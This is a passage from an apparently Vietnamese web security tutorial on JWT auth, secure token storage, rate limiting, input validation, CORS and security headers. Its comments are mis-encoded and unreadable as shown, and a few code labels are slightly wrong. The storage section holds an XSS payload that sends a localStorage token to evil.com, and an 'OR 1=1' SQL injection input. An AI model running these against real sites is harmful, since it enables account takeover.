// 2. Browser tá»± Ä‘á»™ng gá»­i cookies â†’ nhÆ°ng KHÃ”NG tá»± Ä‘á»™ng gá»­i custom headers/body
// 3. Request tá»« evil.com thiáº¿u token â†’ server reject â†’ CSRF tháº¥t báº¡i

// ============================================
// 4ï¸âƒ£ AUTHENTICATION & AUTHORIZATION (XÃC THá»°C & PHÃ‚N QUYá»€N)
// ============================================

// Giáº£i thÃ­ch JWT (JSON Web Token):
// Token chá»©a thÃ´ng tin user (id, email, role) Ä‘Æ°á»£c mÃ£ hÃ³a
// Server kÃ½ token báº±ng secret key â†’ client khÃ´ng thá»ƒ fake token
// 2 loáº¡i token: Access Token (ngáº¯n háº¡n) + Refresh Token (dÃ i háº¡n)

import jwt from 'jsonwebtoken';
import bcrypt from 'bcrypt';

// SERVER: Login API
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;

  // TÃ¬m user trong database
  const user = await User.findOne({ email });

  if (!user) {
    return res.status(401).json({ error: 'Email khÃ´ng tá»“n táº¡i' });
  }

  // Verify password (so sÃ¡nh vá»›i hash trong DB)
  const validPassword = await bcrypt.compare(password, user.passwordHash);

  if (!validPassword) {
    return res.status(401).json({ error: 'Máº­t kháº©u khÃ´ng Ä‘Ãºng' });
  }

  // âœ… Generate Access Token (Token truy cáº­p - ngáº¯n háº¡n: 15 phÃºt)
  // Táº¡i sao ngáº¯n háº¡n? Náº¿u bá»‹ Ä‘Ã¡nh cáº¯p â†’ hacker chá»‰ dÃ¹ng Ä‘Æ°á»£c 15 phÃºt
  const accessToken = jwt.sign(
    { userId: user.id, email: user.email, role: user.role },  // Payload: thÃ´ng tin user
    process.env.JWT_SECRET!,  // Secret key Ä‘á»ƒ kÃ½ token (giá»¯ bÃ­ máº­t)
    { expiresIn: '15m' }  // Token háº¿t háº¡n sau 15 phÃºt
  );

  // âœ… Generate Refresh Token (Token lÃ m má»›i - dÃ i háº¡n: 7 ngÃ y)
  // DÃ¹ng Ä‘á»ƒ láº¥y access token má»›i khi access token háº¿t háº¡n
  const refreshToken = jwt.sign(
    { userId: user.id },  // Payload Ä‘Æ¡n giáº£n hÆ¡n
    process.env.REFRESH_TOKEN_SECRET!,  // Secret key khÃ¡c vá»›i access token
    { expiresIn: '7d' }  // 7 ngÃ y
  );

  // âœ… LÆ°u refresh token vÃ o httpOnly cookie
  // httpOnly: JavaScript KHÃ”NG Ä‘á»c Ä‘Æ°á»£c â†’ XSS khÃ´ng steal Ä‘Æ°á»£c
  // secure: Chá»‰ gá»­i qua HTTPS
  // sameSite: 'strict' â†’ chá»‘ng CSRF (cookie khÃ´ng gá»­i tá»« site khÃ¡c)
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,  // JS khÃ´ng access Ä‘Æ°á»£c (chá»‘ng XSS)
    secure: true,    // Chá»‰ gá»­i qua HTTPS
    sameSite: 'strict',  // Chá»‘ng CSRF
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 ngÃ y (milliseconds)
  });

  // Tráº£ access token cho client (lÆ°u trong memory, KHÃ”NG localStorage)
  res.json({ accessToken, user: { id: user.id, email: user.email } });
});

// API lÃ m má»›i access token
app.post('/api/refresh', async (req, res) => {
  const { refreshToken } = req.cookies;

  if (!refreshToken) {
    return res.status(401).json({ error: 'KhÃ´ng cÃ³ refresh token' });
  }

  try {
    // Verify refresh token
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET!);

    // Generate access token má»›i
    const newAccessToken = jwt.sign(
      { userId: decoded.userId },
      process.env.JWT_SECRET!,
      { expiresIn: '15m' }
    );

    res.json({ accessToken: newAccessToken });
  } catch (error) {
    res.status(403).json({ error: 'Refresh token khÃ´ng há»£p lá»‡' });
  }
});

// CLIENT: Auth Context vá»›i auto-refresh
import { createContext, useContext, useEffect, useState } from 'react';

const AuthContext = createContext<{ accessToken: string | null }>({ accessToken: null });

function AuthProvider({ children }) {
  const [accessToken, setAccessToken] = useState<string | null>(null);

  // âœ… Auto-refresh token trÆ°á»›c khi háº¿t háº¡n
  // Access token háº¿t háº¡n sau 15 phÃºt â†’ refresh sau 14 phÃºt (dÆ° 1 phÃºt buffer)
  useEffect(() => {
    const refreshInterval = setInterval(async () => {
      console.log('Äang refresh access token...');

      const res = await fetch('/api/refresh', {
        method: 'POST',
        credentials: 'include'  // Gá»­i cookies (chá»©a refresh token)
      });

      if (res.ok) {
        const data = await res.json();
        setAccessToken(data.accessToken);  // Update access token má»›i
        console.log('âœ… Access token Ä‘Ã£ Ä‘Æ°á»£c lÃ m má»›i');
      } else {
        console.log('âŒ Refresh tháº¥t báº¡i â†’ User cáº§n login láº¡i');
        setAccessToken(null);
      }
    }, 14 * 60 * 1000); // 14 phÃºt = 840,000ms

    // Cleanup interval khi unmount
    return () => clearInterval(refreshInterval);
  }, []);

  return (
    <AuthContext.Provider value={{ accessToken }}>
      {children}
    </AuthContext.Provider>
  );
}

// Hook sá»­ dá»¥ng auth
export const useAuth = () => useContext(AuthContext);

// Component gá»i API vá»›i authentication
function UserProfile() {
  const { accessToken } = useAuth();
  const [profile, setProfile] = useState(null);

  useEffect(() => {
    if (accessToken) {
      fetch('/api/profile', {
        headers: {
          'Authorization': `Bearer ${accessToken}`  // Gá»­i access token trong header
        }
      })
        .then(res => res.json())
        .then(data => setProfile(data));
    }
  }, [accessToken]);

  return <div>ThÃ´ng tin user: {profile?.email}</div>;
}

// ============================================
// 5ï¸âƒ£ SECURE STORAGE (LÆ¯U TRá»® AN TOÃ€N)
// ============================================

// NguyÃªn táº¯c: KHÃ”NG BAO GIá»œ lÆ°u sensitive data á»Ÿ client-side (localStorage/sessionStorage)
// LÃ½ do: XSS attack cÃ³ thá»ƒ Ä‘á»c localStorage â†’ steal tokens, passwords, credit cards

// âŒ CÃCH LÆ¯U KHÃ”NG AN TOÃ€N
// localStorage/sessionStorage: JavaScript cÃ³ thá»ƒ Ä‘á»c â†’ XSS steal Ä‘Æ°á»£c
localStorage.setItem('token', accessToken); // âŒ XSS Ä‘á»c Ä‘Æ°á»£c!
localStorage.setItem('refreshToken', refreshToken); // âŒ Ráº¥t nguy hiá»ƒm!
localStorage.setItem('creditCard', '1234-5678-9012-3456'); // âŒ KHÃ”NG BAO GIá»œ lÃ m!
localStorage.setItem('password', 'user123'); // âŒ Cá»±c ká»³ nguy hiá»ƒm!

// Ká»‹ch báº£n táº¥n cÃ´ng:
// 1. Hacker inject XSS: <script>fetch('https://evil.com?data='+localStorage.getItem('token'))</script>
// 2. Script cháº¡y â†’ Ä‘á»c localStorage â†’ gá»­i token vá» server hacker
// 3. Hacker dÃ¹ng token â†’ truy cáº­p account cá»§a user

// âœ… CÃCH LÆ¯U AN TOÃ€N

// 1. HttpOnly Cookies cho Refresh Token (báº£o máº­t nháº¥t)
// httpOnly: JavaScript KHÃ”NG thá»ƒ Ä‘á»c â†’ XSS khÃ´ng steal Ä‘Æ°á»£c
// Server set cookie trong response:
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,    // âœ… JS khÃ´ng access Ä‘Æ°á»£c
  secure: true,      // âœ… Chá»‰ gá»­i qua HTTPS
  sameSite: 'strict', // âœ… Chá»‘ng CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 ngÃ y
});

// Client khÃ´ng thá»ƒ Ä‘á»c cookie nÃ y:
console.log(document.cookie); // KhÃ´ng tháº¥y refreshToken (vÃ¬ httpOnly)

// 2. Memory-only cho Access Token (lÆ°u trong React state/context)
// Access token chá»‰ tá»“n táº¡i trong memory â†’ máº¥t khi reload page
function App() {
  const [accessToken, setAccessToken] = useState<string | null>(null);

  // Khi login thÃ nh cÃ´ng
  const handleLogin = async (email: string, password: string) => {
    const res = await fetch('/api/login', {
      method: 'POST',
      body: JSON.stringify({ email, password })
    });

    const data = await res.json();
    setAccessToken(data.accessToken); // âœ… LÆ°u trong memory (React state)
    // KHÃ”NG lÆ°u vÃ o localStorage
  };

  return <div>App content...</div>;
}

// 3. Session Storage (tá»‘t hÆ¡n localStorage nhÆ°ng váº«n cÃ³ risk)
// sessionStorage: Tá»“n táº¡i trong 1 tab, máº¥t khi Ä‘Ã³ng tab
// Váº«n cÃ³ thá»ƒ bá»‹ XSS steal â†’ chá»‰ dÃ¹ng cho non-sensitive data
sessionStorage.setItem('theme', 'dark'); // âœ… OK cho data khÃ´ng nháº¡y cáº£m
sessionStorage.setItem('language', 'vi'); // âœ… OK

// âŒ KHÃ”NG dÃ¹ng cho sensitive data
sessionStorage.setItem('token', token); // âŒ Váº«n cÃ³ XSS risk

// 4. Encrypted Storage (MÃ£ hÃ³a trÆ°á»›c khi lÆ°u - fallback option)
// Chá»‰ dÃ¹ng khi Báº®T BUá»˜C pháº£i lÆ°u client-side
import CryptoJS from 'crypto-js';

const SECRET_KEY = 'your-encryption-key'; // Láº¥y tá»« env hoáº·c server

// Encrypt trÆ°á»›c khi lÆ°u
const encryptData = (data: string) => {
  return CryptoJS.AES.encrypt(data, SECRET_KEY).toString();
};

// Decrypt khi Ä‘á»c
const decryptData = (encrypted: string) => {
  const bytes = CryptoJS.AES.decrypt(encrypted, SECRET_KEY);
  return bytes.toString(CryptoJS.enc.Utf8);
};

// LÆ°u data Ä‘Ã£ mÃ£ hÃ³a
const encrypted = encryptData(sensitiveData);
localStorage.setItem('data', encrypted);

// Äá»c vÃ  giáº£i mÃ£
const encrypted = localStorage.getItem('data');
const decrypted = decryptData(encrypted);

// âš ï¸ LÆ¯U Ã: Encryption KHÃ”NG an toÃ n 100%
// - Secret key váº«n á»Ÿ client â†’ hacker cÃ³ thá»ƒ tÃ¬m tháº¥y
// - Chá»‰ lÃ m khÃ³ hacker hÆ¡n, KHÃ”NG ngÄƒn Ä‘Æ°á»£c hoÃ n toÃ n

// ğŸ“‹ Báº¢NG SO SÃNH STORAGE OPTIONS
/*
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Storage Type         â”‚ XSS Risk    â”‚ CSRF Risk   â”‚ Best Use Case    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ HttpOnly Cookie      â”‚ âœ… Low      â”‚ âš ï¸ Medium   â”‚ Refresh Token    â”‚
â”‚ Memory (React State) â”‚ âœ… Low      â”‚ âœ… Low      â”‚ Access Token     â”‚
â”‚ localStorage         â”‚ âŒ High     â”‚ âœ… Low      â”‚ Non-sensitive    â”‚
â”‚ sessionStorage       â”‚ âŒ High     â”‚ âœ… Low      â”‚ Non-sensitive    â”‚
â”‚ Encrypted Storage    â”‚ âš ï¸ Medium   â”‚ âœ… Low      â”‚ Fallback only    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
*/

// âœ… BEST PRACTICE:
// - Refresh Token â†’ httpOnly cookie (server-side)
// - Access Token â†’ React state/Context (memory)
// - User preferences â†’ localStorage (non-sensitive)
// - NEVER store passwords, credit cards, API keys trong client

// ============================================
// 6ï¸âƒ£ API SECURITY (Báº¢O Máº¬T API)
// ============================================

// ğŸ›¡ï¸ A. Rate Limiting (Giá»›i Háº¡n Sá»‘ Request)
// Má»¥c Ä‘Ã­ch: NgÄƒn DDoS attack, brute-force attack, spam
// VD: Hacker thá»­ 1 triá»‡u passwords â†’ rate limit cháº·n sau 5 láº§n thá»­

const rateLimit = require('express-rate-limit');

// Rate limiter cho toÃ n bá»™ API
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // Cá»­a sá»• thá»i gian: 15 phÃºt
  max: 100, // Tá»‘i Ä‘a 100 requests trong 15 phÃºt (tá»« 1 IP)
  message: 'QuÃ¡ nhiá»u requests, vui lÃ²ng thá»­ láº¡i sau',
  standardHeaders: true, // Tráº£ vá» RateLimit headers (X-RateLimit-*)
  legacyHeaders: false,  // Táº¯t headers cÅ©
});

// Ãp dá»¥ng cho táº¥t cáº£ API routes
app.use('/api/', apiLimiter);

// Rate limiter nghiÃªm ngáº·t hÆ¡n cho login (chá»‘ng brute-force)
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 phÃºt
  max: 5, // Chá»‰ cho 5 láº§n thá»­ login trong 15 phÃºt
  message: 'QuÃ¡ nhiá»u láº§n thá»­ login, tÃ i khoáº£n táº¡m khÃ³a 15 phÃºt',
  skipSuccessfulRequests: true // KhÃ´ng Ä‘áº¿m request thÃ nh cÃ´ng
});

app.post('/api/login', loginLimiter, async (req, res) => {
  // Login logic...
});

// ğŸ›¡ï¸ B. Input Validation (Kiá»ƒm Tra Dá»¯ Liá»‡u Äáº§u VÃ o)
// NguyÃªn táº¯c: KHÃ”NG BAO GIá»œ tin tÆ°á»Ÿng input tá»« client
// LuÃ´n validate á»Ÿ server-side (client validation cÃ³ thá»ƒ bá»‹ bypass)

import { z } from 'zod'; // ThÆ° viá»‡n validation máº¡nh máº½

// Schema cho transfer request
const transferSchema = z.object({
  amount: z.number()
    .positive('Sá»‘ tiá»n pháº£i > 0')  // Pháº£i lÃ  sá»‘ dÆ°Æ¡ng
    .max(1000000, 'Sá»‘ tiá»n tá»‘i Ä‘a 1 triá»‡u'),  // Giá»›i háº¡n trÃªn

  accountNumber: z.string()
    .regex(/^\d{10}$/, 'Sá»‘ tÃ i khoáº£n pháº£i cÃ³ 10 chá»¯ sá»‘'),  // ÄÃºng format

  description: z.string()
    .max(200, 'MÃ´ táº£ tá»‘i Ä‘a 200 kÃ½ tá»±')
    .optional()  // Field khÃ´ng báº¯t buá»™c
});

// API endpoint vá»›i validation
app.post('/api/transfer', async (req, res) => {
  try {
    // âœ… Validate input vá»›i Zod
    const data = transferSchema.parse(req.body);

    // Validation pass â†’ data Ä‘Ã£ clean vÃ  Ä‘Ãºng type
    console.log('âœ… Data há»£p lá»‡:', data);

    // Xá»­ lÃ½ transfer vá»›i data Ä‘Ã£ validate
    const result = await processTransfer(data);

    res.json({ success: true, result });

  } catch (error) {
    // Validation fail â†’ tráº£ lá»—i chi tiáº¿t
    if (error instanceof z.ZodError) {
      console.log('âŒ Validation errors:', error.errors);
      return res.status(400).json({
        error: 'Dá»¯ liá»‡u khÃ´ng há»£p lá»‡',
        details: error.errors
      });
    }

    res.status(500).json({ error: 'Lá»—i server' });
  }
});

// ğŸ›¡ï¸ C. CORS Configuration (Kiá»ƒm SoÃ¡t Nguá»“n Gá»‘c Requests)
// CORS: Quy Ä‘á»‹nh domain nÃ o Ä‘Æ°á»£c phÃ©p call API
import cors from 'cors';

// CORS config nghiÃªm ngáº·t
const corsOptions = {
  origin: [
    'https://yourdomain.com',      // Production domain
    'https://staging.yourdomain.com', // Staging
  ],
  // KHÃ”NG dÃ¹ng origin: '*' trong production (cho phÃ©p má»i domain)

  methods: ['GET', 'POST', 'PUT', 'DELETE'], // HTTP methods cho phÃ©p

  allowedHeaders: [
    'Content-Type',
    'Authorization',
    'X-CSRF-Token'
  ], // Headers cho phÃ©p

  credentials: true, // Cho phÃ©p gá»­i cookies

  maxAge: 86400 // Cache preflight request 24h
};

app.use(cors(corsOptions));

// ğŸ›¡ï¸ D. SQL Injection Prevention (NgÄƒn Cháº·n SQL Injection)
// LUÃ”N dÃ¹ng parameterized queries, KHÃ”NG ná»‘i string SQL

// âŒ KHÃ”NG AN TOÃ€N: String concatenation
const userId = req.params.id;
const query = `SELECT * FROM users WHERE id = ${userId}`; // XSS: userId = "1 OR 1=1"
db.query(query); // âŒ Tráº£ vá» táº¥t cáº£ users!

// âœ… AN TOÃ€N: Parameterized query
const userId = req.params.id;
const query = 'SELECT * FROM users WHERE id = ?'; // Placeholder
db.query(query, [userId]); // âœ… Library tá»± Ä‘á»™ng escape

// ğŸ›¡ï¸ E. API Authentication (XÃ¡c Thá»±c API)
// Middleware kiá»ƒm tra token
const authenticateToken = (req, res, next) => {
  // Láº¥y token tá»« header
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // "Bearer TOKEN"

  if (!token) {
    return res.status(401).json({ error: 'Thiáº¿u access token' });
  }

  try {
    // Verify token
    const decoded = jwt.verify(token, process.env.JWT_SECRET!);
    req.user = decoded; // Gáº¯n user info vÃ o request
    next(); // Token há»£p lá»‡ â†’ tiáº¿p tá»¥c
  } catch (error) {
    return res.status(403).json({ error: 'Token khÃ´ng há»£p lá»‡ hoáº·c háº¿t háº¡n' });
  }
};

// Ãp dá»¥ng middleware cho protected routes
app.get('/api/profile', authenticateToken, (req, res) => {
  // req.user Ä‘Ã£ cÃ³ thÃ´ng tin tá»« token
  res.json({ user: req.user });
});

app.post('/api/transfer', authenticateToken, apiLimiter, async (req, res) => {
  // Multiple layers: Authentication + Rate limiting + Validation
  // ...
});

// ============================================
// 7ï¸âƒ£ SECURITY HEADERS (HEADERS Báº¢O Máº¬T)
// ============================================

// Security Headers: HTTP response headers tÄƒng cÆ°á»ng báº£o máº­t
// Helmet.js: ThÆ° viá»‡n tá»± Ä‘á»™ng set cÃ¡c security headers

import helmet from 'helmet';
import express from 'express';

const app = express();

// Ãp dá»¥ng Helmet vá»›i config chi tiáº¿t
app.use(helmet({

  // 1. Content Security Policy (CSP) - Kiá»ƒm soÃ¡t nguá»“n tÃ i nguyÃªn
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],  // Máº·c Ä‘á»‹nh chá»‰ load tá»« cÃ¹ng origin

      scriptSrc: [
        "'self'",  // Scripts tá»« cÃ¹ng domain
        "'unsafe-inline'",  // Cho phÃ©p inline scripts (cáº§n cho React)
        "https://trusted-cdn.com"  // CDN tin cáº­y
      ],

      styleSrc: [
        "'self'",
        "'unsafe-inline'"  // Inline styles (cáº§n cho styled-components)
      ],

      imgSrc: [
        "'self'",  // Images tá»« domain
        "data:",   // Data URLs (base64 images)
        "https:"   // HTTPS images
      ],

      connectSrc: [
        "'self'",  // Fetch/WebSocket tá»« domain
        "https://api.example.com"  // API endpoints
      ],

      fontSrc: ["'self'", "https://fonts.gstatic.com"],

      objectSrc: ["'none'"],  // KhÃ´ng cho phÃ©p <object>, <embed>

      mediaSrc: ["'self'"],  // Video/Audio

      frameSrc: ["'none'"]  // KhÃ´ng cho phÃ©p iframe
    }
  },

  // 2. X-Frame-Options - Chá»‘ng Clickjacking
  // Clickjacking: Hacker nhÃºng site vÃ o iframe, lá»«a user click vÃ o button áº©n
  xFrameOptions: {
    action: 'deny'  // KhÃ´ng cho phÃ©p site Ä‘Æ°á»£c nhÃºng trong iframe
  },
  // Hoáº·c: action: 'sameorigin' (chá»‰ iframe tá»« cÃ¹ng domain)

  // 3. X-Content-Type-Options - Chá»‘ng MIME type sniffing
  // noSniff: true â†’ Browser khÃ´ng Ä‘oÃ¡n MIME type, pháº£i dÃ¹ng Ä‘Ãºng Content-Type
  noSniff: true,
  // VD: File .txt cÃ³ MIME text/plain â†’ browser KHÃ”NG execute nhÆ° JavaScript

  // 4. Referrer-Policy - Kiá»ƒm soÃ¡t thÃ´ng tin Referrer
  referrerPolicy: {
    policy: 'no-referrer'  // KhÃ´ng gá»­i referrer header (giáº¥u nguá»“n gá»‘c request)
  },
  // CÃ¡c option khÃ¡c: 'no-referrer-when-downgrade', 'same-origin', 'strict-origin'

  // 5. X-XSS-Protection (Legacy, CSP tá»‘t hÆ¡n)
  xssFilter: true,  // Enable XSS filter built-in cá»§a browser

  // 6. Strict-Transport-Security (HSTS)
  hsts: {
    maxAge: 31536000,  // 1 nÄƒm (giÃ¢y)
    includeSubDomains: true,  // Ãp dá»¥ng cho subdomain
    preload: true  // ÄÆ°a vÃ o HSTS preload list
  }

}));

// Hoáº·c set headers thá»§ cÃ´ng
app.use((req, res, next) => {
  // CSP Header
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'"
  );

  // X-Frame-Options
  res.setHeader('X-Frame-Options', 'DENY');

  // X-Content-Type-Options
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // Referrer-Policy
  res.setHeader('Referrer-Policy', 'no-referrer');

  // Permissions-Policy (táº¯t features khÃ´ng dÃ¹ng)
  res.setHeader(
    'Permissions-Policy',
    'geolocation=(), microphone=(), camera=()'  // Táº¯t location, mic, camera
  );

  next();
});

// ğŸ“‹ Báº¢NG TÃ“M Táº®T SECURITY HEADERS
/*
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Header                     â”‚ Má»¥c ÄÃ­ch                                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Content-Security-Policy    â”‚ Kiá»ƒm soÃ¡t nguá»“n scripts, styles, images  â”‚
â”‚ X-Frame-Options            â”‚ Chá»‘ng Clickjacking (iframe embed)        â”‚
â”‚ X-Content-Type-Options     â”‚ Chá»‘ng MIME type sniffing                 â”‚
â”‚ Referrer-Policy            â”‚ Kiá»ƒm soÃ¡t thÃ´ng tin referrer             â”‚
â”‚ Strict-Transport-Security  â”‚ Báº¯t buá»™c HTTPS                           â”‚
â”‚ X-XSS-Protection           â”‚ Enable browser XSS filter (legacy)       â”‚
â”‚ Permissions-Policy         â”‚ Táº¯t browser features khÃ´ng dÃ¹ng          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
*/

// âœ… Kiá»ƒm tra headers:
// 1. Má»Ÿ DevTools â†’ Network tab
// 2. Chá»n request báº¥t ká»³
// 3. Xem Response Headers
// 4. Hoáº·c dÃ¹ng https://securityheaders.com Ä‘á»ƒ scan

// VÃ Dá»¤ RESPONSE HEADERS:
/*
HTTP/2 200
content-security-policy: default-src 'self'
x-frame-options: DENY
x-content-type-options: nosniff
referrer-policy: no-referrer
strict-transport-security: max-age=31536000; includeSubDomains; preload
*/
```

**ğŸ¯ Security Checklist:**

```typescript
// âœ… Security Checklist cho Trading Platform

const securityChecklist = {
  transport: {
    https: true,
    hsts: true,
    tlsVersion: 'TLS 1.3',
    certificateExpiry: 'Valid',
  },

  xssPrevention: {
    inputSanitization: true,
    outputEncoding: true,
    cspHeaders: true,
    dompurify: true,
  },

  csrfProtection: {
    csrfTokens: true,
    sameSiteCookies: true,
    customHeaders: true,
  },

  authentication: {
    jwtTokens: true,
    refreshTokens: true,
    tokenExpiry: '15m',
    passwordHashing: 'bcrypt',
  },

  storage: {
    noSensitiveLocalStorage: true,
    httpOnlyCookies: true,
    encryptedData: true,
  },

  apiSecurity: {
    rateLimiting: true,
    inputValidation: true,
    cors: true,
    apiKeys: true,
  },

  headers: {
    contentSecurityPolicy: true,
    xFrameOptions: true,
    xContentTypeOptions: true,
    referrerPolicy: true,
  },
};
```

**Best Practices:**

1. **Defense in Depth**: Multiple layers of security
2. **Principle of Least Privilege**: Minimal permissions
3. **Input Validation**: Server-side validation always
4. **Secure Storage**: HttpOnly cookies, no localStorage for sensitive data
5. **Regular Updates**: Dependencies, libraries, frameworks
6. **Security Audits**: Penetration testing, code reviews
7. **Monitoring**: Log security events, detect anomalies

**Common Mistakes (Lá»—i Báº£o Máº­t ThÆ°á»ng Gáº·p):**

```typescript
// âŒ Lá»–I 1: LÆ°u tokens trong localStorage
// Váº¥n Ä‘á»: XSS cÃ³ thá»ƒ Ä‘á»c localStorage â†’ steal token
localStorage.setItem('token', token); // âŒ Nguy hiá»ƒm!
localStorage.setItem('refreshToken', refreshToken); // âŒ Ráº¥t nguy hiá»ƒm!

// âœ… CÃCH Sá»¬A: DÃ¹ng HttpOnly cookies
// Server:
res.cookie('refreshToken', token, {
  httpOnly: true, // JavaScript khÃ´ng Ä‘á»c Ä‘Æ°á»£c
  secure: true, // Chá»‰ gá»­i qua HTTPS
  sameSite: 'strict', // Chá»‘ng CSRF
});
// Client: KhÃ´ng cáº§n lÃ m gÃ¬, browser tá»± Ä‘á»™ng gá»­i cookie

// âŒ Lá»–I 2: KhÃ´ng sanitize user input
// Váº¥n Ä‘á»: User nháº­p <script>alert('XSS')</script> â†’ script cháº¡y
function Comment({ content }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />; // âŒ Nguy hiá»ƒm!
}

// âœ… CÃCH Sá»¬A: DÃ¹ng DOMPurify sanitize
import DOMPurify from 'dompurify';

function Comment({ content }) {
  const clean = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'], // Chá»‰ cho phÃ©p tags an toÃ n
    ALLOWED_ATTR: [], // KhÃ´ng cho phÃ©p attributes
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />; // âœ… An toÃ n
}

// âŒ Lá»–I 3: KhÃ´ng cÃ³ CSRF protection
// Váº¥n Ä‘á»: Hacker lá»«a user click link â†’ browser gá»­i request kÃ¨m cookies
fetch('/api/transfer', {
  method: 'POST',
  body: JSON.stringify({ amount: 1000 }),
}); // âŒ Thiáº¿u CSRF token

// âœ… CÃCH Sá»¬A: Gá»­i CSRF token
// 1. Láº¥y token tá»« server
const csrfToken = await fetch('/api/csrf-token').then((r) => r.json());

// 2. Gá»­i token cÃ¹ng request
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken.token, // âœ… Gá»­i token
  },
  body: JSON.stringify({ amount: 1000, csrfToken: csrfToken.token }),
});

// âŒ Lá»–I 4: Password yáº¿u
// Váº¥n Ä‘á»: Password ngáº¯n â†’ dá»… brute-force
const isValid = password.length >= 6; // âŒ QuÃ¡ yáº¿u (123456, password)

// âœ… CÃCH Sá»¬A: Password policy máº¡nh
// Regex: Ãt nháº¥t 12 kÃ½ tá»±, cÃ³ chá»¯ thÆ°á»ng, chá»¯ hoa, sá»‘, kÃ½ tá»± Ä‘áº·c biá»‡t
const passwordRegex =
  /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{12,}$/;

function validatePassword(password: string): boolean {
  if (!passwordRegex.test(password)) {
    throw new Error(
      'Password pháº£i cÃ³ Ã­t nháº¥t 12 kÃ½ tá»±, bao gá»“m chá»¯ hoa, chá»¯ thÆ°á»ng, sá»‘ vÃ  kÃ½ tá»± Ä‘áº·c biá»‡t'
    );
  }
  return true;
}

// VD: "Pass123!" â†’ âŒ Fail (chá»‰ 8 kÃ½ tá»±)
//     "MySecurePass123!" â†’ âœ… Pass

// âŒ Lá»–I 5: KhÃ´ng cÃ³ rate limiting
// Váº¥n Ä‘á»: Hacker thá»­ 1 triá»‡u passwords trong vÃ i phÃºt
app.post('/api/login', async (req, res) => {
  // âŒ KhÃ´ng giá»›i háº¡n â†’ brute-force dá»… dÃ ng
  const user = await authenticateUser(req.body);
  res.json(user);
});

// âœ… CÃCH Sá»¬A: ThÃªm rate limiting
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 phÃºt
  max: 5, // Chá»‰ cho 5 láº§n thá»­
  message: 'QuÃ¡ nhiá»u láº§n thá»­ login, vui lÃ²ng thá»­ láº¡i sau 15 phÃºt',
});

app.post('/api/login', loginLimiter, async (req, res) => {
  // âœ… Giá»›i háº¡n 5 láº§n/15 phÃºt â†’ brute-force khÃ³ hÆ¡n
  const user = await authenticateUser(req.body);
  res.json(user);
});

// âŒ Lá»–I 6: Hardcode secrets trong code
// Váº¥n Ä‘á»: Secret bá»‹ lá»™ khi push lÃªn GitHub
const JWT_SECRET = 'my-secret-key-123'; // âŒ Nguy hiá»ƒm!
const API_KEY = 'sk_live_abc123xyz'; // âŒ Lá»™ API key

// âœ… CÃCH Sá»¬A: DÃ¹ng environment variables
// File: .env
// JWT_SECRET=randomly-generated-secure-key-xyz789
// API_KEY=sk_live_abc123xyz

// Code:
